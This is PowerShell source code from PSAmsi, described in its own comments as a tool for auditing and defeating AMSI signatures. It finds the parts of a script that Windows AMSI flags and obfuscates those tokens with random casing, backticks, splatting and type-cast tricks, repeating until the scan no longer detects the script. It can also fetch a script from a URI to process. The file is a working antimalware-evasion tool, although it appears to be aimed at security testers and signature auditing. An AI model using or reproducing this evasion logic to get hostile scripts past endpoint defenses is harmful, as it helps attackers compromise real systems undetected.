class PowerShellObfuscator {

    $ObfuscationCache = @{}

    PowerShellObfuscator() {}

    PowerShellObfuscator([HashTable] $ObfuscationCache) {
        $this.ObfuscationCache = $ObfuscationCache
    }

    [String] GetMinimallyObfuscated([String] $ScriptString, [Object] $PSAmsiScanner, [Object[]] $AmsiSignatures) {
        $CreatedPSAmsiScanner = $False
        If (-not $PSAmsiScanner) {
            $CreatedPSAmsiScanner = $True
            $PSAmsiScanner = New-PSAmsiScanner
        } ElseIf (-not $PSAmsiScanner.GetType().Name -eq 'PSAmsiScanner') {
            throw "PSAmsiScanner must be of type [PSAmsiScanner]"
        }

        If ($this.ObfuscationCache.Contains($ScriptString)) { return $this.ObfuscationCache[$ScriptString] }

        $PSTokens = Get-PSTokens -ScriptString $ScriptString
        $OriginalScript = $ScriptString

        # Get all the AmsiFlaggedStrings that we must obfuscate, if they were not provided
        If (-not $AmsiSignatures) {
            # No need to get the AbstractSyntaxTree unless we must search for AmsiFlaggedStrings
            $AbstractSyntaxTree = Get-Ast -ScriptString $ScriptString
            $AmsiSignatures = Find-AmsiSignatures -Ast $AbstractSyntaxTree -PSTokens $PSTokens -PSAmsiScanner $PSAmsiScanner | Sort-Object -Descending { $_.StartOffset}
        }

        $AmsiAstSignatures = @()
        If ($AmsiSignatures.Count -gt 0) {
            $AmsiAstSignatures = $AmsiSignatures | ? { $_.SignatureType.Contains('Ast') }
        }
        ForEach ($AmsiAstSignature in $AmsiAstSignatures) {
            If ($this.ObfuscationCache.Contains($AmsiAstSignature.SignatureContent)) { continue }
            
            $ObfuscatedAstExtent = Out-ObfuscatedAst -ScriptString $AmsiAstSignature.SignatureContent
            If (-not (Get-PSAmsiScanResult -ScriptString $ObfuscatedAstExtent -PSAmsiScanner $PSAmsiScanner)) {
                Write-Verbose "[Get-MinimallyObfuscated] Out-ObfuscatedAst obfuscation successful!"
                $this.ObfuscationCache[$AmsiAstSignature.SignatureContent] = $ObfuscatedAstExtent
            } Else { Write-Verbose "[Get-MinimallyObfuscated] Out-ObfuscatedAst obfuscation unsuccessful." }
        }

        ForEach($AmsiSignature in $AmsiSignatures) {
            If ($this.ObfuscationCache.Contains($AmsiSignature.SignatureContent)) { continue }

            # Reset the ScriptString for each Signature obfuscation iteration, so token indices are correct
            # We will actually replace w/ all obfuscated values at the end
            $ScriptString = $OriginalScript
            $ObfuscationSuccessful = $False
            $ObfuscationLevel = 0
            # Iterate obuscation levels until obfuscation succeeds
            While ((-not $ObfuscationSuccessful) -and ($ObfuscationLevel -lt 4)) {
                
                $ObfuscationLevel++
                
                $MatchingTokenArrays = (Get-MatchingPSTokens -SearchString $OriginalScript -SignatureString $AmsiSignature.SignatureContent -PSTokens $PSTokens) -as [array]
                ForEach ($MatchingTokenArray in $MatchingTokenArrays) {
                    # If obfuscation already found for this string, skip it
                    If ($this.ObfuscationCache.Contains($MatchingTokenArray.MatchingString)) { continue }

                    $MatchingTokens = $MatchingTokenArray.MatchingTokens
                    $DoneObfuscating = $False
                    $TokenIndex = 0
                    # Obfuscate the tokens until the string is no longer flagged
                    While (-not $DoneObfuscating) {
                        $MatchingToken = $MatchingTokens[$TokenIndex]
                    
                        If ($MatchingToken.Type -eq 'Comment') {
                            $this.ObfuscationCache[$MatchingTokenArray.MatchingString] = ""
                            $DoneObfuscating = $True
                            $ObfuscationSuccessful = $True
                        }
                        # Only obfuscate the following token types
                        ElseIf ($MatchingToken.Type -in @('String', 'Member', 'CommandArgument', 'Command', 'Variable')) {
                            $ScriptString = Out-ObfuscatedPSToken -ScriptString $ScriptString -PSTokens $MatchingTokens -Index $TokenIndex -ObfuscationLevel $ObfuscationLevel
                            # Calculate the replacement string for the current AmsiFlaggedString, based on current obfuscation
                            $ReplacementString = $ScriptString.Substring($MatchingTokenArray.StartIndex, $MatchingTokenArray.Length + ($ScriptString.Length - $OriginalScript.Length))
                            # Check if this current replacement string is still flagged
                            If (-not (Get-PSAmsiScanResult -ScriptString $ReplacementString -PSAmsiScanner $PSAmsiScanner)) {
                                # Done obfuscating if the resulting string is no longer flagged
                                $DoneObfuscating = $True
                                $ObfuscationSuccessful = $True
                                $this.ObfuscationCache[$MatchingTokenArray.MatchingString] = $ReplacementString
                            }
                        }
                        # If we've run through all the strings and the string is still flagged, obfuscation fails
                        If (($TokenIndex -ge ($MatchingTokens.Count-1))) { $DoneObfuscating = $True }
                    
                        Else { $TokenIndex++ }
                    }
                }
            }
        }

        $this.ObfuscationCache.Keys | % {
            # Replace all the strings at the end
            $ScriptString = $ScriptString.Replace($_, $this.ObfuscationCache[$_])
        }

        $this.ObfuscationCache[$OriginalScript] = $ScriptString

        If ($CreatedPSAmsiScanner) {
            $PSAmsiScanner.Dispose()
        }

        return $ScriptString
    }

    [String] GetMinimallyObfuscated([String] $ScriptString, [Object] $PSAmsiScanner) {
        $CreatedPSAmsiScanner = $False
        If (-not $PSAmsiScanner) {
            $CreatedPSAmsiScanner = $True
            $PSAmsiScanner = New-PSAmsiScanner
        } ElseIf (-not $PSAmsiScanner.GetType().Name -eq 'PSAmsiScanner') {
            throw "PSAmsiScanner must be of type [PSAmsiScanner]"
        }

        $Detected = $True
        $MinimallyObfuscated = $ScriptString
        Do {
            $MinimallyObfuscated = $this.GetMinimallyObfuscated($MinimallyObfuscated, $PSAmsiScanner, $null)
            $Detected = Get-PSAmsiScanResult -ScriptString $MinimallyObfuscated -PSAmsiScanner $PSAmsiScanner
        } While($Detected)

        If ($CreatedPSAmsiScanner) {
            $PSAmsiScanner.Dispose()
        }

        return $MinimallyObfuscated
    }

    [String] GetMinimallyObfuscated([String] $ScriptString) {
        return $this.GetMinimallyObfuscated($ScriptString, $null)
    }

    [String] GetMinimallyObfuscated([ScriptBlock] $ScriptBlock, [Object] $PSAmsiScanner, [Object[]] $AmsiSignatures) {
        $ScriptString = $ScriptBlock -as [String]
        return $this.GetMinimallyObfuscated($ScriptString, $PSAmsiScanner, $AmsiSignatures)
    }

    [String] GetMinimallyObfuscated([ScriptBlock] $ScriptBlock, [Object] $PSAmsiScanner) {
        return $this.GetMinimallyObfuscated($ScriptBlock, $PSAmsiScanner)
    }

    [String] GetMinimallyObfuscated([ScriptBlock] $ScriptBlock) {
        return $this.GetMinimallyObfuscated($ScriptBlock, $null)
    }

    [String] GetMinimallyObfuscated([IO.FileInfo] $ScriptPath, [Object] $PSAmsiScanner, [Object[]] $AmsiSignatures) {
        $ScriptString = Get-Content $ScriptPath -Raw
        return $this.GetMinimallyObfuscated($ScriptString, $PSAmsiScanner, $AmsiSignatures)
    }

    [String] GetMinimallyObfuscated([IO.FileInfo] $ScriptPath, [Object] $PSAmsiScanner) {
        return $this.GetMinimallyObfuscated($ScriptPath, $PSAmsiScanner)
    }

    [String] GetMinimallyObfuscated([IO.FileInfo] $ScriptPath) {
        return $this.GetMinimallyObfuscated($ScriptPath, $null)
    }

    [String] GetMinimallyObfuscated([Uri] $ScriptUri, [Object] $PSAmsiScanner, [Object[]] $AmsiSignatures) {
        $ScriptString = [Net.Webclient]::new().DownloadString($ScriptUri)
        return $this.GetMinimallyObfuscated($ScriptString, $PSAmsiScanner, $AmsiSignatures)
    }

    [String] GetMinimallyObfuscated([Uri] $ScriptUri, [Object] $PSAmsiScanner) {
        return $this.GetMinimallyObfuscated($ScriptUri, $PSAmsiScanner)
    }

    [String] GetMinimallyObfuscated([Uri] $ScriptUri) {
        $ScriptString = [Net.Webclient]::new().DownloadString($ScriptUri)
        return $this.GetMinimallyObfuscated($ScriptString, $null)
    }
}

function Get-MatchingPSTokens {
    <#

    .SYNOPSIS

    Gets the PSTokens from a script that contains a portion of an AMSI signature.

    Author: Ryan Cobb (@cobbr_io)
    License: GNU GPLv3
    Required Dependecies: none
    Optional Dependencies: none

    .DESCRIPTION

    Get-MatchingPSTokens gets the tokens from a script that contains a portion of an AMSI signature.

    .PARAMETER SearchString

    The string containing the script to search for the AMSI signature.

    .PARAMETER SignatureString

    The string containing the AMSI signature to search for in the SearchString.

    .PARAMETER PSTokens

    The PSTokens that make up the SearchString script.

    .OUTPUTS

    PSCustomObject

    .EXAMPLE

    $AmsiSignatures = Find-AmsiSignatures -ScriptString $ScriptString
    Get-MatchingPSTokens -SearchString $ScriptString -SignatureString $AmsiSignatures[0] -PSTokens (Get-PSTokens -ScriptString $ScriptString)

    .NOTES

    Get-MatchingPSTokens is a part of PSAmsi, a tool for auditing and defeating AMSI signatures.

    PSAmsi is located at https://github.com/cobbr/PSAmsi. Additional information can be found at https://cobbr.io.

    #>
    [CmdletBinding()] Param (
        [String] $SearchString,
        [String] $SignatureString,
        [System.Management.Automation.PSToken[]] $PSTokens
    )
    $MinIndex = $SearchString.IndexOf($SignatureString)

    While ($MinIndex -ne -1) {
        $MaxIndex = $MinIndex + $SignatureString.Length
        $MatchingTokens = $PSTokens | ? {
            $StartIndex = $_.Start
            $EndIndex = $_.Start + $_.Length
            If ($StartIndex -ge $MinIndex -AND $EndIndex -le $MaxIndex) { $True }
            ElseIf ($EndIndex -ge $MinIndex -AND $EndIndex -le $MaxIndex) { $True }
            ElseIf ($StartIndex -ge $MinIndex -AND $StartIndex -le $MaxIndex) { $True }
            ElseIf ($StartIndex -le $MinIndex -AND $EndIndex -ge $MaxIndex) { $True }
        }
        If ($MatchingTokens.Count -gt 1) {
            $Start = $MatchingTokens[0].Start
            $Length = $MatchingTokens[$MatchingTokens.Count-1].Start + $MatchingTokens[$MatchingTokens.Count-1].Length - $Start
            $MatchingString = $SearchString.Substring($Start, $Length)
            [PSCustomObject] @{ MatchingTokens = ($MatchingTokens | Sort-Object -Descending { $_.Start }); MatchingString = $MatchingString; StartIndex = $Start; Length = $Length}
        } ElseIf ($MatchingTokens.Count -eq 1) {
            [PSCustomObject] @{ MatchingTokens = $MatchingTokens; MatchingString = $SearchString.Substring($MatchingTokens.Start, $MatchingTokens.Length); StartIndex = $MatchingTokens.Start; Length = $MatchingTokens.Length }
        }
        $MinIndex = $SearchString.IndexOf($SignatureString, $MinIndex+1)
    }
}

function Out-ObfuscatedPSToken {
     <#
        .SYNOPSIS

        Obfuscates a single PSToken within a script.

        Author: Daniel Bohannon (@danielhbohannon)
        Modified By: Ryan Cobb (@cobbr_io)
        License: Apache License, Version 2.0
        Required Dependencies: none
        Optional Dependencies: Out-ObfuscatedStringTokenLevel1, Out-RandomCaseToken, Out-ObfuscatedWithTicks,
                               Out-ObfuscatedMemberTokenLevel3, Out-ObfuscatedCommandArgumentTokenLevel3,
                               Out-ObfuscatedCommandTokenLevel2, Out-ObfuscatedVariableTokenLevel1, Out-ObfuscatedTypeToken,
                               Out-RemoveComments

        .DESCRIPTION

        Out-ObfuscatedPSToken obfuscates a specified token within a script and returns
        the resulting script.

        .PARAMETER ScriptString

        The ScriptString that contains the token to be obfuscated.

        .PARAMETER PSTokens

        The set of PSTokens that represents the given ScriptString.

        .PARAMETER Index

        The index of the specified token to be obfuscated within the PSTokens array.

        .OUTPUTS

        String

        .EXAMPLE
        
        Out-ObfuscatedPSToken -ScriptString "Write-Host example" -PSTokens $(Get-PSTokens "Write-Host example") -Index 2

        .NOTES

        Out-ObfuscatedPSToken is a modified version of the original Out-ObfuscatedTokenCommand function included in
        Invoke-Obfuscation. The original description of Out-ObfuscatedTokenCommand is as follows:
        Out-ObfuscatedTokenCommand orchestrates the tokenization and application of all token-based obfuscation functions to provided PowerShell script and places obfuscated tokens back into the provided PowerShell script to evade detection by simple IOCs and process execution monitoring relying solely on command-line arguments. If no $TokenTypeToObfuscate is defined then Out-ObfuscatedTokenCommand will automatically perform ALL token obfuscation functions in random order at the highest obfuscation level.
        This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

        .LINK

        http://www.danielbohannon.com

    #>
    param(
        [Parameter(Position = 0, Mandatory)]
        [ValidateNotNullOrEmpty()]
        [String] $ScriptString,

        [Parameter(Position = 1, Mandatory)]
        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.PSToken[]] $PSTokens,

        [Parameter(Position = 2, Mandatory)]
        [ValidateRange(0, [Int]::MaxValue)]
        [Int] $Index,

        [Parameter(Position = 3)]
        [ValidateRange(1, 4)]
        [Int] $ObfuscationLevel = 1

    )
    $PSToken = $PSTokens[$Index]
    If (($PSToken.Type -eq 'String')) {
        # If String $Token immediately follows a period (and does not begin $ScriptString) then do not obfuscate as a String.
        # In this scenario $Token is originally a Member token that has quotes added to it.
        # E.g. both InvokeCommand and InvokeScript in $ExecutionContext.InvokeCommand.InvokeScript
        If (($PSToken.Start -gt 0) -AND ($ScriptString.SubString($PSToken.Start-1,1) -eq '.')) {
            Continue
        }
            
        # Set valid obfuscation levels for current token type.
        $ValidObfuscationLevels = @(1,2)

        # If invalid obfuscation level is passed to this function then default to highest obfuscation level available for current token type.
        If($ValidObfuscationLevels -NotContains $ObfuscationLevel) {$ObfuscationLevel = $ValidObfuscationLevels | Sort-Object -Descending | Select-Object -First 1} 

        # The below Parameter Binding Validation Attributes cannot have their string values formatted with the -f format operator unless treated as a scriptblock.
        # When we find strings following these Parameter Binding Validation Attributes then if we are using a -f format operator we will treat the result as a scriptblock.
        # Source: https://technet.microsoft.com/en-us/library/hh847743.aspx
        $ParameterValidationAttributesToTreatStringAsScriptblock  = @()
        $ParameterValidationAttributesToTreatStringAsScriptblock += 'alias'
        $ParameterValidationAttributesToTreatStringAsScriptblock += 'allownull'
        $ParameterValidationAttributesToTreatStringAsScriptblock += 'allowemptystring'
        $ParameterValidationAttributesToTreatStringAsScriptblock += 'allowemptycollection'
        $ParameterValidationAttributesToTreatStringAsScriptblock += 'validatecount'
        $ParameterValidationAttributesToTreatStringAsScriptblock += 'validatelength'
        $ParameterValidationAttributesToTreatStringAsScriptblock += 'validatepattern'
        $ParameterValidationAttributesToTreatStringAsScriptblock += 'validaterange'
        $ParameterValidationAttributesToTreatStringAsScriptblock += 'validatescript'
        $ParameterValidationAttributesToTreatStringAsScriptblock += 'validateset'
        $ParameterValidationAttributesToTreatStringAsScriptblock += 'validatenotnull'
        $ParameterValidationAttributesToTreatStringAsScriptblock += 'validatenotnullorempty'

        $ParameterValidationAttributesToTreatStringAsScriptblock += 'helpmessage'
        $ParameterValidationAttributesToTreatStringAsScriptblock += 'confirmimpact'
        $ParameterValidationAttributesToTreatStringAsScriptblock += 'outputtype'

        Switch ($ObfuscationLevel) {
            1 {$ScriptString = Out-ObfuscatedStringTokenLevel1 $ScriptString $PSToken 1}
            2 {$ScriptString = Out-ObfuscatedStringTokenLevel1 $ScriptString $PSToken 2}
        }

    }
    ElseIf ($PSToken.Type -eq 'Member') {
        # Set valid obfuscation levels for current token type.
        $ValidObfuscationLevels = @(1,2,3,4)
            
        # If invalid obfuscation level is passed to this function then default to highest obfuscation level available for current token type.
        If($ValidObfuscationLevels -NotContains $ObfuscationLevel) {$ObfuscationLevel = $ValidObfuscationLevels | Sort-Object -Descending | Select-Object -First 1}

        # The below Parameter Attributes cannot be obfuscated like other Member Tokens, so we will only randomize the case of these tokens.
        # Source 1: https://technet.microsoft.com/en-us/library/hh847743.aspx
        $MemberTokensToOnlyRandomCase  = @()
        $MemberTokensToOnlyRandomCase += 'mandatory'
        $MemberTokensToOnlyRandomCase += 'position'
        $MemberTokensToOnlyRandomCase += 'parametersetname'
        $MemberTokensToOnlyRandomCase += 'valuefrompipeline'
        $MemberTokensToOnlyRandomCase += 'valuefrompipelinebypropertyname'
        $MemberTokensToOnlyRandomCase += 'valuefromremainingarguments'
        $MemberTokensToOnlyRandomCase += 'helpmessage'
        $MemberTokensToOnlyRandomCase += 'alias'
        # Source 2: https://technet.microsoft.com/en-us/library/hh847872.aspx
        $MemberTokensToOnlyRandomCase += 'confirmimpact'
        $MemberTokensToOnlyRandomCase += 'defaultparametersetname'
        $MemberTokensToOnlyRandomCase += 'helpuri'
        $MemberTokensToOnlyRandomCase += 'supportspaging'
        $MemberTokensToOnlyRandomCase += 'supportsshouldprocess'
        $MemberTokensToOnlyRandomCase += 'positionalbinding'

        $MemberTokensToOnlyRandomCase += 'ignorecase'

        Switch ($ObfuscationLevel) {
            1 {$ScriptString = Out-RandomCaseToken             $ScriptString $PSToken}
            2 {$ScriptString = Out-ObfuscatedWithTicks         $ScriptString $PSToken}
            3 {$ScriptString = Out-ObfuscatedMemberTokenLevel3 $ScriptString $PSTokens $Index 1}
            4 {$ScriptString = Out-ObfuscatedMemberTokenLevel3 $ScriptString $PSTokens $Index 2}
        }
    }
    ElseIf ($PSToken.Type -eq 'CommandArgument') {
        # Set valid obfuscation levels for current token type.
        $ValidObfuscationLevels = @(1,2,3,4)
            
        # If invalid obfuscation level is passed to this function then default to highest obfuscation level available for current token type.
        If($ValidObfuscationLevels -NotContains $ObfuscationLevel) {$ObfuscationLevel = $ValidObfuscationLevels | Sort-Object -Descending | Select-Object -First 1} 

        Switch($ObfuscationLevel)
        {
            1 {$ScriptString = Out-RandomCaseToken                      $ScriptString $PSToken}
            2 {$ScriptString = Out-ObfuscatedWithTicks                  $ScriptString $PSToken}
            3 {$ScriptString = Out-ObfuscatedCommandArgumentTokenLevel3 $ScriptString $PSToken 1}
            4 {$ScriptString = Out-ObfuscatedCommandArgumentTokenLevel3 $ScriptString $PSToken 2}
        }
    }
    ElseIf ($PSToken.Type -eq 'Command') {
        # Set valid obfuscation levels for current token type.
        $ValidObfuscationLevels = @(1,2,3)
            
        # If invalid obfuscation level is passed to this function then default to highest obfuscation level available for current token type.
        If($ValidObfuscationLevels -NotContains $ObfuscationLevel) {$ObfuscationLevel = $ValidObfuscationLevels | Sort-Object -Descending | Select-Object -First 1}

        # If a variable is encapsulated in curly braces (e.g. ${ExecutionContext}) then the string inside is treated as a Command token.
        # So we will force tick obfuscation (option 1) instead of splatting (option 2) as that would cause errors.
        If(($PSToken.Start -gt 1) -AND ($ScriptString.SubString($PSToken.Start-1,1) -eq '{') -AND ($ScriptString.SubString($PSToken.Start+$PSToken.Length,1) -eq '}')) {
            $ObfuscationLevel = 1
        }
            
        Switch($ObfuscationLevel) {
            1 {$ScriptString = Out-ObfuscatedWithTicks          $ScriptString $PSToken}
            2 {$ScriptString = Out-ObfuscatedCommandTokenLevel2 $ScriptString $PSToken 1}
            3 {$ScriptString = Out-ObfuscatedCommandTokenLevel2 $ScriptString $PSToken 2}
        }
    }
    ElseIf ($PSToken.Type -eq 'Variable') {
        $ScriptString = Out-ObfuscatedVariableTokenLevel1 $ScriptString $PSToken
    }
    ElseIf ($PSToken.Type -eq 'Type') {
        # Set valid obfuscation levels for current token type.
        $ValidObfuscationLevels = @(1,2)
            
        # If invalid obfuscation level is passed to this function then default to lowest obfuscation level available for current token type.
        If($ValidObfuscationLevels -NotContains $ObfuscationLevel) {$ObfuscationLevel = $ValidObfuscationLevels | Select-Object -First 1}

        # The below Type value substrings are part of Types that cannot be direct Type casted, so we will not perform direct Type casting on Types containing these values.
        $TypesThatCannotByDirectTypeCasted  = @()
        $TypesThatCannotByDirectTypeCasted += 'directoryservices.accountmanagement.'
        $TypesThatCannotByDirectTypeCasted += 'windows.clipboard'

        Switch ($ObfuscationLevel) {
            1 {$ScriptString = Out-ObfuscatedTypeToken $ScriptString $PSToken 1}
            2 {$ScriptString = Out-ObfuscatedTypeToken $ScriptString $PSToken 2}
        }
    }
    ElseIf ($PSToken.Type -eq 'Comment') {
        $ScriptString = Out-RemoveComments $ScriptString $PSTokens[$Index]
    }

    $ScriptString
}

function New-PowerShellObfuscator {
    <#

    .SYNOPSIS

    Creates a [PowerShellObfuscator] object for obfuscating PowerShell scripts to pass AMSI scans.

    Author: Ryan Cobb (@cobbr_io)
    License: GNU GPLv3
    Required Dependecies: PowerShellObfuscator
    Optional Dependencies: none

    .DESCRIPTION

    New-PowerShellObfuscator creates a [PowerShellObfuscator] object for obfuscating PowerShell scripts to pass AMSI scans.

    .PARAMETER ObfuscationCache

    Specify an ObfuscationCache that is a Hastable correlating AMSI signatures to known successful obfuscated version that pass AMSI scans.

    .OUTPUTS

    PowerShellObfuscator

    .EXAMPLE

    $Obfuscator = New-PowerShellObfuscator

    .NOTES

    New-PowerShellObfuscator is a part of PSAmsi, a tool for auditing and defeating AMSI signatures.

    PSAmsi is located at https://github.com/cobbr/PSAmsi. Additional information can be found at https://cobbr.io.

    #>
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNull()]
        [HashTable] $ObfuscationCache = @{}
    )
    [PowerShellObfuscator]::new($ObfuscationCache)
}

function Get-MinimallyObfuscated {
    <#
    .SYNOPSIS

    Gets a minimally obfuscated copy of a script that passes AMSI scans.

    Author: Ryan Cobb (@cobbr_io)
    License: GNU GPLv3
    Required Dependecies: PowerShellObfuscator, New-PowerShellObfuscator
    Optional Dependencies: none

    .DESCRIPTION

    Get-MinimallyObfuscated gets a minimally obfuscated copy of a script that passes AMSI scans.

    .PARAMETER ScriptString

    Specifies the string containing the original script to be minimally obfuscated.

    .PARAMETER ScriptBlock

    Specifies the ScriptBlock containing the original script to be minimally obfuscated.

    .PARAMETER ScriptPath

    Specifies the Path to the original script to be minimally obfuscated.

    .PARAMETER ScriptUri

    The URI of the original script to be minimally obfuscated.

    .PARAMETER AmsiSignatures

    Specify the AMSI signatures that need to be obfuscated. These
    strings will be found manually, if not provided.

    .PARAMETER PSAmsiScanner

    Specifies the PSAmsiScanner to use for AMSI scans.

    .PARAMETER Obfuscator

    Specifies the PowerShellObfuscator to use for obfuscation.

    .OUTPUTS

    String

    .EXAMPLE

    Get-MinimallyObfuscated -ScriptString "Write-Host example"

    .EXAMPLE

    Get-MinamallyObfuscated -ScriptBlock { Write-Host "example" }
        
    .EXAMPLE
        
    Get-MinimallyObfuscated -ScriptPath ./Write-Example.ps1

    .NOTES

    New-PowerShellObfuscator is a part of PSAmsi, a tool for auditing and defeating AMSI signatures.

    PSAmsi is located at https://github.com/cobbr/PSAmsi. Additional information can be found at https://cobbr.io.
        
    #>
    [CmdletBinding(DefaultParameterSetName = "ByString")] Param(
        [Parameter(ParameterSetName = "ByString", Position = 0, ValueFromPipeline, ValueFromPipelineByPropertyName, Mandatory)]
        [ValidateNotNullOrEmpty()]
        [String] $ScriptString,

        [Parameter(ParameterSetName = "ByScriptBlock", Position = 0, ValueFromPipeline, ValueFromPipelineByPropertyName, Mandatory)]
        [ValidateNotNullOrEmpty()]
        [ScriptBlock] $ScriptBlock,

        [Parameter(ParameterSetName = "ByPath", Position = 0, ValueFromPipelineByPropertyName, Mandatory)]
        [ValidateScript({Test-Path $_ -PathType leaf})]
        [Alias('PSPath')]
        [String] $ScriptPath,

        [Parameter(ParameterSetName = "ByUri", Position = 0, ValueFromPipeline, ValueFromPipelineByPropertyName, Mandatory)]
        [ValidateScript({$_.Scheme -match 'http|https'})]
        [Uri] $ScriptUri,

        [Parameter(Position = 1)]
        [String[]] $AmsiSignatures,

        [Parameter(Position = 2)]
        [ValidateScript({$_.GetType().Name -eq 'PSAmsiScanner'})]
        [Object] $PSAmsiScanner,

        [Parameter(Position = 3)]
        [ValidateScript({$_.GetType().Name -eq 'PowerShellObfuscator'})]
        [Object] $Obfuscator
    )
    Begin {
        If (-not $Obfuscator) { $Obfuscator = New-PowerShellObfuscator }
    }
    Process {
        If ($AmsiSignatures) {
            If ($ScriptString) { $Obfuscator.GetMinimallyObfuscated($ScriptString, $PSAmsiScanner, $AmsiSignatures) }
            ElseIf ($ScriptBlock) { $Obfuscator.GetMinimallyObfuscated($ScriptBlock, $PSAmsiScanner, $AmsiSignatures) }
            ElseIf ($ScriptPath) { $Obfuscator.GetMinimallyObfuscated($ScriptPath, $PSAmsiScanner, $AmsiSignatures) }
            ElseIf ($ScriptUri) { $Obfuscator.GetMinimallyObfuscated($ScriptUri, $PSAmsiScanner, $AmsiSignatures) }
        }
        Else {
            If ($ScriptString) { $Obfuscator.GetMinimallyObfuscated($ScriptString, $PSAmsiScanner) }
            ElseIf ($ScriptBlock) { $Obfuscator.GetMinimallyObfuscated($ScriptBlock, $PSAmsiScanner) }
            ElseIf ($ScriptPath) { $Obfuscator.GetMinimallyObfuscated($ScriptPath, $PSAmsiScanner) }
            ElseIf ($ScriptUri) { $Obfuscator.GetMinimallyObfuscated($ScriptUri, $PSAmsiScanner) }
        }
    }
}